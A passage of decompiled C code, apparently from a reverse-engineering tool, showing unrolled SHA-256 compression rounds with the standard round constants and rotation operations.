uVar11 >> 0x19)\n            );\n    uVar12 = uVar12 + iVar4;\n    uVar8 = iVar4 + ((uVar3 ^ uVar5) & uVar10 ^ uVar3 & uVar5) +\n                    ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n                    (uVar10 * 0x400 | uVar10 >> 0x16));\n    iVar4 = (~uVar12 & uVar15 ^ uVar11 & uVar12) +\n            auStack328[14] + 0x9bdc06a7 + uVar14 +\n            ((uVar12 >> 0xb | uVar12 * 0x200000) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^ (uVar12 * 0x80 | uVar12 >> 0x19)\n            );\n    uVar3 = uVar3 + iVar4;\n    uVar14 = iVar4 + ((uVar5 ^ uVar10) & uVar8 ^ uVar5 & uVar10) +\n                     ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^\n                     (uVar8 * 0x400 | uVar8 >> 0x16));\n    iVar4 = (uVar12 & uVar3 ^ ~uVar3 & uVar11) +\n            auStack328[15] + 0xc19bf174 + uVar15 +\n            ((uVar3 * 0x80 | uVar3 >> 0x19) ^ (uVar3 >> 0xb | uVar3 * 0x200000) ^ (uVar3 >> 6 | uVar3 * 0x4000000));\n    uVar5 = uVar5 + iVar4;\n    uVar15 = ((uVar10 ^ uVar8) & uVar14 ^ uVar10 & uVar8) +\n             ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n             (uVar14 * 0x400 | uVar14 >> 0x16)) + iVar4;\n    iVar4 = (uVar3 & uVar5 ^ ~uVar5 & uVar12) +\n            uVar11 + 0xe49b69c1 + auStack328[16] +\n            ((uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000) ^ (uVar5 >> 0xb | uVar5 * 0x200000));\n    uVar10 = uVar10 + iVar4;\n    uVar11 = ((uVar8 ^ uVar14) & uVar15 ^ uVar8 & uVar14) +\n             ((uVar15 >> 0xd | uVar15 * 0x80000) ^ (uVar15 >> 2 | uVar15 * 0x40000000) ^\n             (uVar15 * 0x400 | uVar15 >> 0x16)) + iVar4;\n    iVar4 = (uVar5 & uVar10 ^ ~uVar10 & uVar3) +\n            uVar12 + 0xefbe4786 + auStack328[17] +\n            ((uVar10 * 0x80 | uVar10 >> 0x19) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^ (uVar10 >> 0xb | uVar10 * 0x200000)\n            );\n    uVar8 = uVar8 + iVar4;\n    uVar12 = ((uVar14 ^ uVar15) & uVar11 ^ uVar14 & uVar15) +\n             ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n             (uVar11 * 0x400 | uVar11 >> 0x16)) + iVar4;\n    iVar4 = (uVar10 & uVar8 ^ ~uVar8 & uVar5) +\n            uVar3 + 0xfc19dc6 + auStack328[18] +\n            ((uVar8 * 0x80 | uVar8 >> 0x19) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^ (uVar8 >> 0xb | uVar8 * 0x200000));\n    uVar14 = uVar14 + iVar4;\n    uVar9 = ((uVar15 ^ uVar11) & uVar12 ^ uVar15 & uVar11) +\n            ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n            (uVar12 * 0x400 | uVar12 >> 0x16)) + iVar4;\n    iVar4 = (uVar8 & uVar14 ^ ~uVar14 & uVar10) +\n            uVar5 + 0x240ca1cc + auStack328[19] +\n            ((uVar14 * 0x80 | uVar14 >> 0x19) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^ (uVar14 >> 0xb | uVar14 * 0x200000)\n            );\n    uVar15 = uVar15 + iVar4;\n    uVar3 = ((uVar11 ^ uVar12) & uVar9 ^ uVar11 & uVar12) +\n            ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^ (uVar9 * 0x400 | uVar9 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar14 & uVar15 ^ ~uVar15 & uVar8) +\n            ((uVar15 * 0x80 | uVar15 >> 0x19) ^ (uVar15 >> 6 | uVar15 * 0x4000000) ^ (uVar15 >> 0xb | uVar15 * 0x200000)\n            ) + uVar10 + 0x2de92c6f + auStack328[20];\n    uVar11 = uVar11 + iVar4;\n    uVar5 = ((uVar12 ^ uVar9) & uVar3 ^ uVar12 & uVar9) +\n            ((uVar3 >> 0xd | uVar3 * 0x80000) ^ (uVar3 >> 2 | uVar3 * 0x40000000) ^ (uVar3 * 0x400 | uVar3 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar15 & uVar11 ^ ~uVar11 & uVar14) +\n            uVar8 + 0x4a7484aa + auStack328[21] +\n            ((uVar11 * 0x80 | uVar11 >> 0x19) ^ (uVar11 >> 0xb | uVar11 * 0x200000) ^ (uVar11 >> 6 | uVar11 * 0x4000000)\n            );\n    uVar12 = uVar12 + iVar4;\n    uVar8 = ((uVar9 ^ uVar3) & uVar5 ^ uVar9 & uVar3) +\n            ((uVar5 >> 0xd | uVar5 * 0x80000) ^ (uVar5 >> 2 | uVar5 * 0x40000000) ^ (uVar5 * 0x400 | uVar5 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar11 & uVar12 ^ ~uVar12 & uVar15) +\n            uVar14 + 0x5cb0a9dc + auStack328[22] +\n            ((uVar12 * 0x80 | uVar12 >> 0x19) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^ (uVar12 >> 0xb | uVar12 * 0x200000)\n            );\n    uVar9 = uVar9 + iVar4;\n    uVar14 = ((uVar3 ^ uVar5) & uVar8 ^ uVar3 & uVar5) +\n             ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^ (uVar8 * 0x400 | uVar8 >> 0x16)) +\n             iVar4;\n    iVar4 = (uVar12 & uVar9 ^ ~uVar9 & uVar11) +\n            uVar15 + 0x76f988da + auStack328[23] +\n            ((uVar9 * 0x80 | uVar9 >> 0x19) ^ (uVar9 >> 0xb | uVar9 * 0x200000) ^ (uVar9 >> 6 | uVar9 * 0x4000000));\n    uVar3 = uVar3 + iVar4;\n    uVar10 = ((uVar5 ^ uVar8) & uVar14 ^ uVar5 & uVar8) +\n             ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n             (uVar14 * 0x400 | uVar14 >> 0x16)) + iVar4;\n    iVar4 = (uVar9 & uVar3 ^ ~uVar3 & uVar12) +\n            uVar11 + 0x983e5152 + auStack328[24] +\n            ((uVar3 * 0x80 | uVar3 >> 0x19) ^ (uVar3 >> 6 | uVar3 * 0x4000000) ^ (uVar3 >> 0xb | uVar3 * 0x200000));\n    uVar5 = uVar5 + iVar4;\n    uVar11 = ((uVar8 ^ uVar14) & uVar10 ^ uVar8 & uVar14) +\n             ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n             (uVar10 * 0x400 | uVar10 >> 0x16)) + iVar4;\n    iVar4 = (uVar3 & uVar5 ^ ~uVar5 & uVar9) +\n            uVar12 + 0xa831c66d + auStack328[25] +\n            ((uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000) ^ (uVar5 >> 0xb | uVar5 * 0x200000));\n    uVar8 = uVar8 + iVar4;\n    uVar12 = ((uVar14 ^ uVar10) & uVar11 ^ uVar14 & uVar10) +\n             ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n             (uVar11 * 0x400 | uVar11 >> 0x16)) + iVar4;\n    iVar4 = (uVar5 & uVar8 ^ ~uVar8 & uVar3) +\n            uVar9 + 0xb00327c8 + auStack328[26] +\n            ((uVar8 * 0x80 | uVar8 >> 0x19) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^ (uVar8 >> 0xb | uVar8 * 0x200000));\n    uVar14 = uVar14 + iVar4;\n    uVar9 = ((uVar10 ^ uVar11) & uVar12 ^ uVar10 & uVar11) +\n            ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n            (uVar12 * 0x400 | uVar12 >> 0x16)) + iVar4;\n    iVar4 = (uVar8 & uVar14 ^ ~uVar14 & uVar5) +\n            uVar3 + 0xbf597fc7 + auStack328[27] +\n            ((uVar14 * 0x80 | uVar14 >> 0x19) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^ (uVar14 >> 0xb | uVar14 * 0x200000)\n            );\n    uVar10 = uVar10 + iVar4;\n    uVar3 = ((uVar11 ^ uVar12) & uVar9 ^ uVar11 & uVar12) +\n            ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^ (uVar9 * 0x400 | uVar9 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar14 & uVar10 ^ ~uVar10 & uVar8) +\n            uVar5 + 0xc6e00bf3 + auStack328[28] +\n            ((uVar10 * 0x80 | uVar10 >> 0x19) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^ (uVar10 >> 0xb | uVar10 * 0x200000)\n            );\n    uVar11 = uVar11 + iVar4;\n    uVar5 = ((uVar12 ^ uVar9) & uVar3 ^ uVar12 & uVar9) +\n            ((uVar3 >> 0xd | uVar3 * 0x80000) ^ (uVar3 >> 2 | uVar3 * 0x40000000) ^ (uVar3 * 0x400 | uVar3 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar10 & uVar11 ^ ~uVar11 & uVar14) +\n            uVar8 + 0xd5a79147 + auStack328[29] +\n            ((uVar11 * 0x80 | uVar11 >> 0x19) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^ (uVar11 >> 0xb | uVar11 * 0x200000)\n            );\n    uVar12 = uVar12 + iVar4;\n    uVar8 = ((uVar9 ^ uVar3) & uVar5 ^ uVar9 & uVar3) +\n            ((uVar5 >> 0xd | uVar5 * 0x80000) ^ (uVar5 >> 2 | uVar5 * 0x40000000) ^ (uVar5 * 0x400 | uVar5 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar11 & uVar12 ^ ~uVar12 & uVar10) +\n            uVar14 + 0x6ca6351 + auStack328[30] +\n            ((uVar12 * 0x80 | uVar12 >> 0x19) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^ (uVar12 >> 0xb | uVar12 * 0x200000)\n            );\n    uVar9 = uVar9 + iVar4;\n    uVar14 = ((uVar3 ^ uVar5) & uVar8 ^ uVar3 & uVar5) +\n             ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^ (uVar8 * 0x400 | uVar8 >> 0x16)) +\n             iVar4;\n    iVar4 = (uVar12 & uVar9 ^ ~uVar9 & uVar11) +\n            uVar10 + 0x14292967 + auStack328[31] +\n            ((uVar9 * 0x80 | uVar9 >> 0x19) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^ (uVar9 >> 0xb | uVar9 * 0x200000));\n    uVar3 = uVar3 + iVar4;\n    uVar10 = ((uVar5 ^ uVar8) & uVar14 ^ uVar5 & uVar8) +\n             ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n             (uVar14 * 0x400 | uVar14 >> 0x16)) + iVar4;\n    iVar4 = (uVar9 & uVar3 ^ ~uVar3 & uVar12) +\n            uVar11 + 0x27b70a85 + auStack328[32] +\n            ((uVar3 * 0x80 | uVar3 >> 0x19) ^ (uVar3 >> 6 | uVar3 * 0x4000000) ^ (uVar3 >> 0xb | uVar3 * 0x200000));\n    uVar5 = uVar5 + iVar4;\n    uVar11 = ((uVar8 ^ uVar14) & uVar10 ^ uVar8 & uVar14) +\n             ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n             (uVar10 * 0x400 | uVar10 >> 0x16)) + iVar4;\n    iVar4 = (uVar3 & uVar5 ^ ~uVar5 & uVar9) +\n            uVar12 + 0x2e1b2138 + auStack328[33] +\n            ((uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000) ^ (uVar5 >> 0xb | uVar5 * 0x200000));\n    uVar8 = uVar8 + iVar4;\n    uVar12 = ((uVar14 ^ uVar10) & uVar11 ^ uVar14 & uVar10) +\n             ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n             (uVar11 * 0x400 | uVar11 >> 0x16)) + iVar4;\n    iVar4 = (uVar5 & uVar8 ^ ~uVar8 & uVar3) +\n            uVar9 + 0x4d2c6dfc + auStack328[34] +\n            ((uVar8 * 0x80 | uVar8 >> 0x19) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^ (uVar8 >> 0xb | uVar8 * 0x200000));\n    uVar14 = uVar14 + iVar4;\n    uVar9 = ((uVar10 ^ uVar11) & uVar12 ^ uVar10 & uVar11) +\n            ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n            (uVar12 * 0x400 | uVar12 >> 0x16)) + iVar4;\n    iVar4 = (uVar8 & uVar14 ^ ~uVar14 & uVar5) +\n            uVar3 + 0x53380d13 + auStack328[35] +\n            ((uVar14 * 0x80 | uVar14 >> 0x19) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^ (uVar14 >> 0xb | uVar14 * 0x200000)\n            );\n    uVar10 = uVar10 + iVar4;\n    uVar3 = ((uVar11 ^ uVar12) & uVar9 ^ uVar11 & uVar12) +\n            ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^ (uVar9 * 0x400 | uVar9 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar14 & uVar10 ^ ~uVar10 & uVar8) +\n            uVar5 + 0x650a7354 + auStack328[36] +\n            ((uVar10 * 0x80 | uVar10 >> 0x19) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^ (uVar10 >> 0xb | uVar10 * 0x200000)\n            );\n    uVar11 = uVar11 + iVar4;\n    uVar5 = ((uVar12 ^ uVar9) & uVar3 ^ uVar12 & uVar9) +\n            ((uVar3 >> 0xd | uVar3 * 0x80000) ^ (uVar3 >> 2 | uVar3 * 0x40000000) ^ (uVar3 * 0x400 | uVar3 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar10 & uVar11 ^ ~uVar11 & uVar14) +\n            uVar8 + 0x766a0abb + auStack328[37] +\n            ((uVar11 * 0x80 | uVar11 >> 0x19) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^ (uVar11 >> 0xb | uVar11 * 0x200000)\n            );\n    uVar12 = uVar12 + iVar4;\n    uVar8 = ((uVar9 ^ uVar3) & uVar5 ^ uVar9 & uVar3) +\n            ((uVar5 >> 0xd | uVar5 * 0x80000) ^ (uVar5 >> 2 | uVar5 * 0x40000000) ^ (uVar5 * 0x400 | uVar5 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar11 & uVar12 ^ ~uVar12 & uVar10) +\n            uVar14 + 0x81c2c92e + auStack328[38] +\n            ((uVar12 * 0x80 | uVar12 >> 0x19) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^ (uVar12 >> 0xb | uVar12 * 0x200000)\n            );\n    uVar9 = uVar9 + iVar4;\n    uVar14 = ((uVar3 ^ uVar5) & uVar8 ^ uVar3 & uVar5) +\n             ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^ (uVar8 * 0x400 | uVar8 >> 0x16)) +\n             iVar4;\n    iVar4 = (uVar12 & uVar9 ^ ~uVar9 & uVar11) +\n            uVar10 + 0x92722c85 + auStack328[39] +\n            ((uVar9 * 0x80 | uVar9 >> 0x19) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^ (uVar9 >> 0xb | uVar9 * 0x200000));\n    uVar3 = uVar3 + iVar4;\n    uVar10 = ((uVar5 ^ uVar8) & uVar14 ^ uVar5 & uVar8) +\n             ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n             (uVar14 * 0x400 | uVar14 >> 0x16)) + iVar4;\n    iVar4 = (uVar9 & uVar3 ^ ~uVar3 & uVar12) +\n            uVar11 + 0xa2bfe8a1 + auStack328[40] +\n            ((uVar3 * 0x80 | uVar3 >> 0x19) ^ (uVar3 >> 6 | uVar3 * 0x4000000) ^ (uVar3 >> 0xb | uVar3 * 0x200000));\n    uVar5 = uVar5 + iVar4;\n    uVar11 = ((uVar8 ^ uVar14) & uVar10 ^ uVar8 & uVar14) +\n             ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n             (uVar10 * 0x400 | uVar10 >> 0x16)) + iVar4;\n    iVar4 = (uVar3 & uVar5 ^ ~uVar5 & uVar9) +\n            uVar12 + 0xa81a664b + auStack328[41] +\n            ((uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000) ^ (uVar5 >> 0xb | uVar5 * 0x200000));\n    uVar8 = uVar8 + iVar4;\n    uVar12 = ((uVar14 ^ uVar10) & uVar11 ^ uVar14 & uVar10) +\n             ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n             (uVar11 * 0x400 | uVar11 >> 0x16)) + iVar4;\n    iVar4 = (uVar5 & uVar8 ^ ~uVar8 & uVar3) +\n            uVar9 + 0xc24b8b70 + auStack328[42] +\n            ((uVar8 * 0x80 | uVar8 >> 0x19) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^ (uVar8 >> 0xb | uVar8 * 0x200000));\n    uVar14 = uVar14 + iVar4;\n    uVar9 = ((uVar10 ^ uVar11) & uVar12 ^ uVar10 & uVar11) +\n            ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n            (uVar12 * 0x400 | uVar12 >> 0x16)) + iVar4;\n    iVar4 = (uVar8 & uVar14 ^ ~uVar14 & uVar5) +\n            uVar3 + 0xc76c51a3 + auStack328[43] +\n            ((uVar14 * 0x80 | uVar14 >> 0x19) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^ (uVar14 >> 0xb | uVar14 * 0x200000)\n            );\n    uVar10 = uVar10 + iVar4;\n    uVar3 = ((uVar11 ^ uVar12) & uVar9 ^ uVar11 & uVar12) +\n            ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^ (uVar9 * 0x400 | uVar9 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar14 & uVar10 ^ ~uVar10 & uVar8) +\n            uVar5 + 0xd192e819 + auStack328[44] +\n            ((uVar10 * 0x80 | uVar10 >> 0x19) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^ (uVar10 >> 0xb | uVar10 * 0x200000)\n            );\n    uVar11 = uVar11 + iVar4;\n    uVar5 = ((uVar12 ^ uVar9) & uVar3 ^ uVar12 & uVar9) +\n            ((uVar3 >> 0xd | uVar3 * 0x80000) ^ (uVar3 >> 2 | uVar3 * 0x40000000) ^ (uVar3 * 0x400 | uVar3 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar10 & uVar11 ^ ~uVar11 & uVar14) +\n            uVar8 + 0xd6990624 + auStack328[45] +\n            ((uVar11 * 0x80 | uVar11 >> 0x19) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^ (uVar11 >> 0xb | uVar11 * 0x200000)\n            );\n    uVar12 = uVar12 + iVar4;\n    uVar8 = ((uVar9 ^ uVar3) & uVar5 ^ uVar9 & uVar3) +\n            ((uVar5 >> 0xd | uVar5 * 0x80000) ^ (uVar5 >> 2 | uVar5 * 0x40000000) ^ (uVar5 * 0x400 | uVar5 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar11 & uVar12 ^ ~uVar12 & uVar10) +\n            uVar14 + 0xf40e3585 + auStack328[46] +\n            ((uVar12 * 0x80 | uVar12 >> 0x19) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^ (uVar12 >> 0xb | uVar12 * 0x200000)\n            );\n    uVar9 = uVar9 + iVar4;\n    uVar14 = ((uVar3 ^ uVar5) & uVar8 ^ uVar3 & uVar5) +\n             ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^ (uVar8 * 0x400 | uVar8 >> 0x16)) +\n             iVar4;\n    iVar4 = (uVar12 & uVar9 ^ ~uVar9 & uVar11) +\n            uVar10 + 0x106aa070 + auStack328[47] +\n            ((uVar9 * 0x80 | uVar9 >> 0x19) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^ (uVar9 >> 0xb | uVar9 * 0x200000));\n    uVar3 = uVar3 + iVar4;\n    uVar10 = ((uVar5 ^ uVar8) & uVar14 ^ uVar5 & uVar8) +\n             ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n             (uVar14 * 0x400 | uVar14 >> 0x16)) + iVar4;\n    iVar4 = (uVar9 & uVar3 ^ ~uVar3 & uVar12) +\n            uVar11 + 0x19a4c116 + auStack328[48] +\n            ((uVar3 * 0x80 | uVar3 >> 0x19) ^ (uVar3 >> 6 | uVar3 * 0x4000000) ^ (uVar3 >> 0xb | uVar3 * 0x200000));\n    uVar5 = uVar5 + iVar4;\n    uVar11 = ((uVar8 ^ uVar14) & uVar10 ^ uVar8 & uVar14) +\n             ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n             (uVar10 * 0x400 | uVar10 >> 0x16)) + iVar4;\n    iVar4 = (uVar3 & uVar5 ^ ~uVar5 & uVar9) +\n            uVar12 + 0x1e376c08 + auStack328[49] +\n            ((uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000) ^ (uVar5 >> 0xb | uVar5 * 0x200000));\n    uVar8 = uVar8 + iVar4;\n    uVar12 = ((uVar14 ^ uVar10) & uVar11 ^ uVar14 & uVar10) +\n             ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n             (uVar11 * 0x400 | uVar11 >> 0x16)) + iVar4;\n    iVar4 = (uVar5 & uVar8 ^ ~uVar8 & uVar3) +\n            uVar9 + 0x2748774c + auStack328[50] +\n            ((uVar8 * 0x80 | uVar8 >> 0x19) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^ (uVar8 >> 0xb | uVar8 * 0x200000));\n    uVar14 = uVar14 + iVar4;\n    uVar9 = ((uVar10 ^ uVar11) & uVar12 ^ uVar10 & uVar11) +\n            ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n            (uVar12 * 0x400 | uVar12 >> 0x16)) + iVar4;\n    iVar4 = (uVar8 & uVar14 ^ ~uVar14 & uVar5) +\n            uVar3 + 0x34b0bcb5 + auStack328[51] +\n            ((uVar14 * 0x80 | uVar14 >> 0x19) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^ (uVar14 >> 0xb | uVar14 * 0x200000)\n            );\n    uVar10 = uVar10 + iVar4;\n    uVar3 = ((uVar11 ^ uVar12) & uVar9 ^ uVar11 & uVar12) +\n            ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^ (uVar9 * 0x400 | uVar9 >> 0x16)) +\n            iVar4;\n    iVar4 = (uVar14 & uVar10 ^ ~uVar10 & uVar8) +\n            uVar5 + 0x391c0cb3 + auStack328[52] +\n            ((uVar10 * 0x80 | uVar10 >> 0x19) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^ (uVar10 >> 0xb | uVar10 * 0x200000)\n            );\n    uVar11 = uVar11 + iVar4;\n    uVar13 = ((uVar12 ^ uVar9) & uVar3 ^ uVar12 & uVar9) +\n             ((uVar3 >> 0xd | uVar3 * 0x80000) ^ (uVar3 >> 2 | uVar3 * 0x40000000) ^ (uVar3 * 0x400 | uVar3 >> 0x16)) +\n             iVar4;\n    iVar4 = (uVar10 & uVar11 ^ ~uVar11 & uVar14) +\n            uVar8 + 0x4ed8aa4a + auStack328[53] +\n            ((uVar11 * 0x80 | uVar11 >> 0x19) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^ (uVar11 >> 0xb | uVar11 * 0x200000)\n            );\n    uVar12 = uVar12 + iVar4;\n    uVar15 = ((uVar9 ^ uVar3) & uVar13 ^ uVar9 & uVar3) +\n             ((uVar13 >> 0xd | uVar13 * 0x80000) ^ (uVar13 >> 2 | uVar13 * 0x40000000) ^\n             (uVar13 * 0x400 | uVar13 >> 0x16)) + iVar4;\n    iVar4 = (uVar11 & uVar12 ^ ~uVar12 & uVar10) +\n            uVar14 + 0x5b9cca4f + auStack328[54] +\n            ((uVar12 * 0x80 | uVar12 >> 0x19) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^ (uVar12 >> 0xb | uVar12 * 0x200000)\n            );\n    uVar9 = uVar9 + iVar4;\n    uVar8 = ((uVar3 ^ uVar13) & uVar15 ^ uVar3 & uVar13) +\n            ((uVar15 >> 0xd | uVar15 * 0x80000) ^ (uVar15 >> 2 | uVar15 * 0x40000000) ^\n            (uVar15 * 0x400 | uVar15 >> 0x16)) + iVar4;\n    iVar4 = (uVar12 & uVar9 ^ ~uVar9 & uVar11) +\n            uVar10 + 0x682e6ff3 + auStack328[55] +\n            ((uVar9 * 0x80 | uVar9 >> 0x19) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^ (uVar9 >> 0xb | uVar9 * 0x200000));\n    uVar3 = uVar3 + iVar4;\n    uVar14 = ((uVar13 ^ uVar15) & uVar8 ^ uVar13 & uVar15) +\n             ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^ (uVar8 * 0x400 | uVar8 >> 0x16)) +\n             iVar4;\n    iVar4 = (uVar9 & uVar3 ^ ~uVar3 & uVar12) +\n            uVar11 + 0x748f82ee + auStack328[56] +\n            ((uVar3 * 0x80 | uVar3 >> 0x19) ^ (uVar3 >> 6 | uVar3 * 0x4000000) ^ (uVar3 >> 0xb | uVar3 * 0x200000));\n    uVar13 = uVar13 + iVar4;\n    uVar5 = ((uVar15 ^ uVar8) & uVar14 ^ uVar15 & uVar8) +\n            ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n            (uVar14 * 0x400 | uVar14 >> 0x16)) + iVar4;\n    iVar4 = (uVar3 & uVar13 ^ ~uVar13 & uVar9) +\n            uVar12 + 0x78a5636f + auStack328[57] +\n            ((uVar13 * 0x80 | uVar13 >> 0x19) ^ (uVar13 >> 6 | uVar13 * 0x4000000) ^ (uVar13 >> 0xb | uVar13 * 0x200000)\n            );\n    uVar15 = uVar15 + iVar4;\n    uVar16 = ((uVar8 ^ uVar14) & uVar5 ^ uVar8 & uVar14) +\n             ((uVar5 >> 0xd | uVar5 * 0x80000) ^ (uVar5 >> 2 | uVar5 * 0x40000000) ^ (uVar5 * 0x400 | uVar5 >> 0x16)) +\n             iVar4;\n    iVar4 = (uVar13 & uVar15 ^ ~uVar15 & uVar3) +\n            uVar9 + 0x84c87814 + auStack328[58] +\n            ((uVar15 * 0x80 | uVar15 >> 0x19) ^ (uVar15 >> 6 | uVar15 * 0x4000000) ^ (uVar15 >> 0xb | uVar15 * 0x200000)\n            );\n    uVar8 = uVar8 + iVar4;\n    uVar12 = ((uVar14 ^ uVar5) & uVar16 ^ uVar14 & uVar5) +\n             ((uVar16 >> 0xd | uVar16 * 0x80000) ^ (uVar16 >> 2 | uVar16 * 0x40000000) ^\n             (uVar16 * 0x400 | uVar16 >> 0x16)) + iVar4;\n    iVar4 = (uVar15 & uVar8 ^ ~uVar8 & uVar13) +\n            uVar3 + 0x8cc70208 + auStack328[59] +\n            ((uVar8 * 0x80 | uVar8 >> 0x19) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^ (uVar8 >> 0xb | uVar8 * 0x200000));\n    uVar14 = uVar14 + iVar4;\n    uVar9 = ((uVar5 ^ uVar16) & uVar12 ^ uVar5 & uVar16) +\n            ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n            (uVar12 * 0x400 | uVar12 >> 0x16)) + iVar4;\n    iVar4 = (uVar8 & uVar14 ^ ~uVar14 & uVar15) +\n            uVar13 + 0x90befffa + auStack328[60] +\n            ((uVar14 * 0x80 | uVar14 >> 0x19) ^ (uVar14 >> 0xb | uVar14 * 0x200000) ^ (uVar14 >> 6 | uVar14 * 0x4000000)\n            );\n    uVar5 = uVar5 + iVar4;\n    uVar11 = ((uVar16 ^ uVar12) & uVar9 ^ uVar16 & uVar12) +\n             ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^ (uVar9 * 0x400 | uVar9 >> 0x16)) +\n             iVar4;\n    iVar4 = (uVar14 & uVar5 ^ ~uVar5 & uVar8) +\n            uVar15 + 0xa4506ceb + auStack328[61] +\n            ((uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 >> 6 | uVar5 * 0x4000000));\n    uVar16 = uVar16 + iVar4;\n    uVar10 